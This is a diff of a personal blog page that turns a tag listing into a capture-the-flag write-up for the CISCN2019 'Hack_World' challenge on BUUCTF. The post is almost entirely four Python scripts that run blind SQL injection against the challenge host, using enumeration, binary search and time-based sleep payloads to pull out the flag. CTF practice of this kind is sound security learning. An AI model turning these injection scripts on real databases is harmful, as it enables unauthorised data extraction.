@@ -8,11 +8,11 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  BUUCTF | Lier
+  CISCN2019 华北赛区 Day2 Web1Hack_World | Lier
 </title>
 <meta
   name="description"
-  content="溯本求源，大道至简"
+  content="脚本"
 /><script>
   window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://www.lier.xin/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
   
@@ -39,24 +39,24 @@
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
 <meta property="og:type" content="website" />
-  <meta property="og:title" content="BUUCTF | Lier" />
+  <meta property="og:title" content="CISCN2019 华北赛区 Day2 Web1Hack_World | Lier" />
   <meta
     property="og:description"
-    content="溯本求源，大道至简"
+    content="脚本"
   />
-  <meta property="og:url" content="https://www.lier.xin/tags/buuctf/" />
+  <meta property="og:url" content="https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/" />
   <meta
     property="og:site_name"
     content="Only_ONE"
   />
   <meta
     property="og:image"
-    content="/"
+    content="/images/buu.png"
   />
   <meta property="article:author" content="Lier" />
   <meta property="article:published_time" content="2025-07-01T14:25:19&#43;08:00" />
-  <meta property="article:modified_time" content="2025-07-01T14:25:19&#43;08:00" /><meta name="twitter:card" content="summary" />
-  <meta name="twitter:image" content="/" /><link rel="alternate" type="application/rss+xml" href="https://www.lier.xin/tags/buuctf/index.xml" title="Only_ONE">
+  <meta property="article:modified_time" content="2025-07-01T14:25:19&#43;08:00" /><meta property="article:tag" content="BUUCTFCISCN" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/buu.png" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.ae1d908d7f5ff8dd2a7f8f641e49366762447f3ee446c7291525d8387ba34463.css" />
 <link
     rel="preload"
@@ -136,19 +136,37 @@
         <a class="main-nav-link" href="/friend">友链</a>
       </span><a id="main-nav-toggle" class="nav-icon"></a>
   </nav>
-  <nav id="sub-nav"><a id="nav-rss-link" class="nav-icon" href="/tags/buuctf/index.xml" title="RSS 订阅" target="_blank"></a><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a></nav></div>
-<header id="header"><picture></picture><img crossorigin="anonymous" fetchpriority="high" src="/images/1.png" alt="BUUCTF"><div id="header-outer">
+  <nav id="sub-nav"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a></nav></div>
+<header id="header"><picture></picture>
+    <img crossorigin="anonymous" fetchpriority="high" src="/images/buu.png" alt="CISCN2019 华北赛区 Day2 Web1Hack_World"><div id="header-outer">
     <div id="header-title"><a href="/" id="logo">
-            <h1 data-aos="slide-up">标签</h1>
-          </a><h2 id="subtitle-wrap" data-aos="slide-down"><a href="/" id="subtitle">BUUCTF</a></h2></div>
+            <h1 data-aos="slide-up">CISCN2019 华北赛区 Day2 Web1Hack_World</h1>
+          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
           class="sidebar-left"
-            ><aside id="sidebar"><div class="sidebar-wrapper ">
+            ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
     <div
       class="sidebar-wrap"
       data-aos="fade-up"
-    ><div class="sidebar-author">
+    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#exp">exp</a>
+      <ul>
+        <li><a href="#枚举法">枚举法</a></li>
+        <li><a href="#二分法">二分法</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
+        <li><a href="#时间二分法">时间二分法</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img
     data-src="/avatar/avatar.webp"
     data-sizes="auto"
@@ -223,491 +241,198 @@
       <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
       <div class="sidebar-menu-link">友链</div>
     </div></div>
-</div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
   </div>
 
-  <div class="sidebar-widget"><div class="widget-wrapper">
-    <div
-      class="widget-wrap"
-      data-aos="fade-up"
-    >
-      <div style="display: flex; justify-content: space-between;">
-        <h3 class="widget-title">分类</h3></div>
-      <div class="widget">
-        <ul class="category-list"><li class="category-list-item">
-                <a class="category-list-link" href="/categories/ctf-great/"
-                  >ctf-great</a
-                >
-              </li><li class="category-list-item">
-                <a class="category-list-link" href="/categories/learning/"
-                  >Learning</a
-                >
-              </li><li class="category-list-item">
-                <a class="category-list-link" href="/categories/writeup/"
-                  >writeup</a
-                >
-              </li></ul>
-      </div>
-    </div>
-  </div><div class="widget-wrapper">
-    <div
-      class="widget-wrap"
-      data-aos="fade-up"
-    >
-      <div style="display: flex; justify-content: space-between;">
-        <h3 class="widget-title">标签</h3></div>
-      <div class="widget">
-        <ul class="tag-list" itemprop="keywords"><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/buuctf/"
-                  aria-label="标签: BUUCTF"
-                >
-                  BUUCTF
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/ciscn/"
-                  aria-label="标签: CISCN"
-                >
-                  CISCN
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/iscc/"
-                  aria-label="标签: Iscc"
-                >
-                  Iscc
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/php_server/"
-                  aria-label="标签: PHP_server"
-                >
-                  PHP_server
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/php%E5%87%BD%E6%95%B0/"
-                  aria-label="标签: Php函数"
-                >
-                  Php函数
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
-                  aria-label="标签: Php反序列化"
-                >
-                  Php反序列化
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/php%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/"
-                  aria-label="标签: PHP解析特性"
-                >
-                  PHP解析特性
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/rce/"
-                  aria-label="标签: Rce"
-                >
-                  Rce
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/sql-%E4%BA%8C%E5%88%86%E6%B3%95/"
-                  aria-label="标签: SQL-二分法"
-                >
-                  SQL-二分法
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/sql%E6%B3%A8%E5%85%A5/"
-                  aria-label="标签: SQL注入"
-                >
-                  SQL注入
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"
-                  aria-label="标签: 代码执行"
-                >
-                  代码执行
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
-                  aria-label="标签: 原型链污染"
-                >
-                  原型链污染
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"
-                  aria-label="标签: 变量覆盖"
-                >
-                  变量覆盖
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
-                  aria-label="标签: 文件上传"
-                >
-                  文件上传
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E7%88%86%E7%A0%B4%E6%97%B6%E9%97%B4%E6%88%B3/"
-                  aria-label="标签: 爆破时间戳"
-                >
-                  爆破时间戳
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"
-                  aria-label="标签: 网鼎杯"
-                >
-                  网鼎杯
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/%E8%BD%AF%E8%BF%9E%E6%8E%A5/"
-                  aria-label="标签: 软连接"
-                >
-                  软连接
-                </a>
-              </li></ul>
-      </div>
-    </div>
-  </div><div class="widget-wrapper">
+  <div class="sidebar-widget"></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
   <div
-    class="widget-wrap"
+    class="article-inner"
     data-aos="fade-up"
   >
-    <h3 class="widget-title">标签云</h3><div class="widget tagcloud"><a
-            style="font-size:10px"
-            href="/tags/buuctf/"
-            aria-label="标签: BUUCTF"
-            >BUUCTF</a
-          ><a
-            style="font-size:10px"
-            href="/tags/ciscn/"
-            aria-label="标签: CISCN"
-            >CISCN</a
-          ><a
-            style="font-size:10px"
-            href="/tags/iscc/"
-            aria-label="标签: Iscc"
-            >Iscc</a
-          ><a
-            style="font-size:10px"
-            href="/tags/php_server/"
-            aria-label="标签: PHP_server"
-            >PHP_server</a
-          ><a
-            style="font-size:10px"
-            href="/tags/php%E5%87%BD%E6%95%B0/"
-            aria-label="标签: Php函数"
-            >Php函数</a
-          ><a
-            style="font-size:10px"
-            href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
-            aria-label="标签: Php反序列化"
-            >Php反序列化</a
-          ><a
-            style="font-size:10px"
-            href="/tags/php%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/"
-            aria-label="标签: PHP解析特性"
-            >PHP解析特性</a
-          ><a
-            style="font-size:10px"
-            href="/tags/rce/"
-            aria-label="标签: Rce"
-            >Rce</a
-          ><a
-            style="font-size:10px"
-            href="/tags/sql-%E4%BA%8C%E5%88%86%E6%B3%95/"
-            aria-label="标签: SQL-二分法"
-            >SQL-二分法</a
-          ><a
-            style="font-size:10px"
-            href="/tags/sql%E6%B3%A8%E5%85%A5/"
-            aria-label="标签: SQL注入"
-            >SQL注入</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"
-            aria-label="标签: 代码执行"
-            >代码执行</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
-            aria-label="标签: 原型链污染"
-            >原型链污染</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"
-            aria-label="标签: 变量覆盖"
-            >变量覆盖</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
-            aria-label="标签: 文件上传"
-            >文件上传</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E7%88%86%E7%A0%B4%E6%97%B6%E9%97%B4%E6%88%B3/"
-            aria-label="标签: 爆破时间戳"
-            >爆破时间戳</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"
-            aria-label="标签: 网鼎杯"
-            >网鼎杯</a
-          ><a
-            style="font-size:10px"
-            href="/tags/%E8%BD%AF%E8%BF%9E%E6%8E%A5/"
-            aria-label="标签: 软连接"
-            >软连接</a
-          ></div>
-  </div>
-</div><div class="widget-wrapper">
-    <div
-      class="widget-wrap"
-      data-aos="fade-up"
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-07-01 14:25:19 &#43;0800 &#43;08" itemprop="datePublished"
+      >2025-07-01</time
     >
-      <h3 class="widget-title">最新文章</h3>
-      <div class="widget">
-        <ul><li>
-              <a href="/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/">CISCN2019 华北赛区 Day2 Web1Hack_World</a>
-            </li><li>
-              <a href="/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/">网鼎杯 2018 Fakebook</a>
-            </li><li>
-              <a href="/post/preg_replace-e-rce/">Preg_replace E Rce</a>
-            </li><li>
-              <a href="/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/">网鼎杯 2020 朱雀组 Phpweb</a>
-            </li><li>
-              <a href="/post/iscc-2025_%E5%9F%BA%E6%9C%AC%E5%8A%9F/">Iscc 2025_基本功</a>
-            </li></ul>
-      </div>
-    </div>
-  </div></div></aside>
-<section id="main"><div
-    class="archives-outer-wrap"
-    data-aos="fade-up"
-  ><div class="tag-wrap"><div
-      class="archives-tag-list-item"
+    <time style="display: none;" id="post-update-time"
+      >2025-07-01</time
+    >
+  </span>
+</div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/ctf-great"
       data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/buuctf/"
+      >CTF-GREAT</a
+    ></div>
+</div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><p>题目很简单，主要是练习一下脚本，做下记录方便查阅</p>
+<h2 id="exp">
+<a class="header-anchor" href="#exp"></a>
+exp
+</h2><h3 id="枚举法">
+<a class="header-anchor" href="#%e6%9e%9a%e4%b8%be%e6%b3%95"></a>
+枚举法
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="s2">&#34;if(substr((select(flag)from(flag)),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,1,0)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">j</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span></code></pre></div><h3 id="二分法">
+<a class="header-anchor" href="#%e4%ba%8c%e5%88%86%e6%b3%95"></a>
+二分法
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># select=&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,0)&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="时间盲注">
+<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8"></a>
+时间盲注
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)=&#39;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;,sleep(2),0)&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">j</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span></code></pre></div><h3 id="时间二分法">
+<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e4%ba%8c%e5%88%86%e6%b3%95"></a>
+时间二分法
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,0,sleep(2))&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><div class="sponsor-wrapper">
+  <div class="sponsor-button-wrapper">
+    <div class="sponsor-icon rotate"></div>
+    <div class="sponsor-title">赞助</div>
+    <div class="sponsor-icon rotate"></div>
+  </div><div class="sponsor-tip">文章内容有收获?打赏一元</div><div class="sponsor-qr"><div class="sponsor-qr-image-wrapper">
+          <img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250618163116936.jpg" alt="支付宝" width="200" />
+          <p class="sponsor-qr-name">支付宝</p>
+        </div></div></div><div class="share-wrapper"><a href="https://twitter.com/intent/tweet?url=https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/&amp;text=CISCN2019%20%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba%20Day2%20Web1Hack_World&amp;via=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="CISCN2019 华北赛区 Day2 Web1Hack_World">
+      <div class="share-icon icon icon-twitter"></div>
+    </a><a href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/&amp;title=CISCN2019%20%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba%20Day2%20Web1Hack_World&amp;desc=%e8%84%9a%e6%9c%ac&amp;source=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="CISCN2019 华北赛区 Day2 Web1Hack_World">
+      <div class="share-icon icon icon-qq"></div>
+    </a><a href="javascript:;"  title="CISCN2019 华北赛区 Day2 Web1Hack_World">
+      <div class="share-icon icon icon-weixin"><div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hugo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div></div>
+    </a></div><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/buuctf"
+        rel="tag"
         >BUUCTF</a
       >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/ciscn/"
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ciscn"
+        rel="tag"
         >CISCN</a
       >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/iscc/"
-        >Iscc</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/php_server/"
-        >PHP_server</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/php%E5%87%BD%E6%95%B0/"
-        >Php函数</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
-        >Php反序列化</a
-      >
-    </div><div
